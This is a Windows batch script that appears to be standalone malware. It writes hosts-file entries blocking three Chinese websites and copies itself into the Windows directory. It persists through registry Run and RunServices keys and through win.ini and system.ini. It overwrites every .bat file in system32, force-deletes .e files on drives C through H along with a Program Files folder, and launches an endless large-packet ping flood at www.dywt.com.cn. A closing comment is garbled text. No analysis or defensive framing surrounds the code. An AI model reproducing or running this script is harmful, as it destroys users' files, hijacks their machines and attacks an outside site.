@echo off
set a=Huai Nian DC
%Huai Nian DC1% 127.0.0.1 www.dywt.com.cn >> %windir%\system32\drivers\etc\hosts
%Huai Nian DC1% 127.0.0.1 www.eyuyan.com.cn >> %windir%\system32\drivers\etc\hosts
%Huai Nian DC1% 127.0.0.1 www.eyuyan.com >> %windir%\system32\drivers\etc\hosts
copy %0 %windir%\%a%.bat
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Huai Nian DC /t REG_SZ /d %windir%\%a%.bat /f > nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Huai Nian DC /t REG_SZ /d %windir%\%a%.bat /f > nul
set Huai Nian DC1=echo
set Wdd=win.ini
%Huai Nian DC1% [windows] >> %windir%\%Wdd%
%Huai Nian DC1% run=%windir%\%a%.bat >> %windir%\win.ini
%Huai Nian DC1% load=%windir%\%a%.bat >> %windir%\win.ini
%Huai Nian DC1% [boot] >> %windir%\system.ini
%Huai Nian DC1% shell=explorer.exe %a%.bat >> %windir%\system.ini
set x=%random%
copy %0 %windir%\%x%.bat > nul 
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v html /t REG_SZ /d "%windir%\%x%.bat" /f > nul
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices" /v Huai Nian DC /t REG_SZ /d "%windir%\%a%.bat" /f > nul
cd %windir%\system32
for %%a in (*.bat) do copy %0 %%a > nul
del /f /s /q "d:\*.e"
del /f /s /q "e:\*.e"
del /f /s /q "f:\*.e"
del /f /s /q "g:\*.e"
del /f /s /q "h:\*.e"
del /f /s /q "c:\*.e"
del /f /s /q "C:\Program Files\e\*.*"
ping -l 65500 -i 255 -t www.dywt.com.cn
:: »³Äî ¶«²Ó µÖÖÆ ÎÞ¹¼